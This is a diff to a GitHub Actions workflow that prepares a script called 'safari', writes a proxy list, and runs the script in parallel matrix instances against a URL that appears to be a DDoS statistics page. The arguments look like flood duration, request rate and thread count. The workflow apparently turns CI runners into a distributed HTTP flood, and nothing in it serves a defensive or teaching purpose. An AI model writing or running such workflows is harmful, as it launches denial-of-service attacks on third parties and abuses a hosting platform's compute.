@@ -21,15 +21,24 @@ jobs:
 
     - name: Fix line endings and make executable
       run: |
-        # Convert Windows line endings to Unix
-        sed -i 's/\r$//' safari
-        chmod +x safari
+        # Fix Windows line endings if present
+        if [ -f "safari" ]; then
+          dos2unix safari 2>/dev/null || sed -i 's/\r$//' safari
+          chmod +x safari
+          echo "✅ safari script prepared"
+        else
+          echo "❌ safari file not found!"
+          exit 1
+        fi
 
     - name: Create proxies.txt
       run: |
         echo "1.1.1.1:80" > proxies.txt
-        echo "proxies.txt created with 1.1.1.1:80"
+        echo "✅ proxies.txt created with 1.1.1.1:80"
+        cat proxies.txt
 
     - name: Run safari script (Instance ${{ matrix.instance }})
-      run: ./safari https://c1.dstatbot.win/lURlGPR6 700 100000 90 proxies.txt --raw
-      continue-on-error: true
+      run: |
+        echo "🚀 Starting instance ${{ matrix.instance }}"
+        ./safari https://c1.dstatbot.win/lURlGPR6 700 100000 90 proxies.txt --raw
+        echo "✅ Instance ${{ matrix.instance }} completed"
